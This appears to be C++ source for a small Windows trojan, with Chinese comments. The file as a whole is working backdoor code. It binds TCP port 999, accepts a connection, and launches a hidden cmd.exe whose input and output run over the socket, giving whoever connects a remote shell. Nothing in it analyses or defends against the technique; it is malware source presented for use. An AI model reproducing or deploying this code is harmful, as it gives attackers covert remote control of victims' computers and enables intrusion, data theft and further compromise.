#ifndef MINI_TROJAN_CPP
#define MINI_TROJAN_CPP

//#define MINI_TROJAN_MAIN

#pragma comment(lib,"ws2_32.lib")
#include <WinSock2.h>
#include <iostream>
#define MASTER_PORT 999

int mini_trojan()
{
	WSADATA ws;
	SOCKET listenFD;
	int ret;
	// 初始化 wsa
	WSAStartup(MAKEWORD(2, 2), &ws);
	// 注意使用WSASocket
	listenFD = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if (listenFD == INVALID_SOCKET)
	{
		std::cout << "WSASocket 失败\n";
		std::cout << WSAGetLastError() << "\n";
		return -1;
	}
	// 监听本机 MASTER_PORT 端口
	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_port = htons(MASTER_PORT);
	server.sin_addr.S_un.S_addr = ADDR_ANY;
	ret = bind(listenFD, (sockaddr *)&server, sizeof(server));
	if (ret)
	{
		std::cout << "绑定端口 失败\n";
		return -1;
	}
	ret = listen(listenFD, 2);
	if (ret)
	{
		std::cout << "listen 失败\n";
		std::cout << WSAGetLastError() << "\n";
		return -1;
	}
	// 如果客户请求此端口，接收连接
	struct sockaddr_in client;
	ZeroMemory(&client, sizeof(client));
	int iAddrSize = sizeof(client);
	SOCKET clientFD = accept(listenFD, (sockaddr*)&client, &iAddrSize);
	if (clientFD == INVALID_SOCKET)
	{
		std::cout << "accept 失败\n";
		std::cout << WSAGetLastError() << "\n";
		return - 1;
	}
	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	// 读写管道
	si.hStdInput = si.hStdOutput = si.hStdError = (void*)clientFD;
	TCHAR cmdLine[] = TEXT("cmd.exe");
	PROCESS_INFORMATION processInformation;
	// 建立进程
	ret = CreateProcess(NULL, cmdLine, NULL, NULL, 1, 0, NULL, NULL, &si, &processInformation);
	if (!ret)
	{
		std::cout << "建立进程 失败\n";
		return -1;
	}
	return 0;
}

#ifdef MINI_TROJAN_MAIN
int main()
{
	std::cout << mini_trojan();

	return 0;
}
#endif

#endif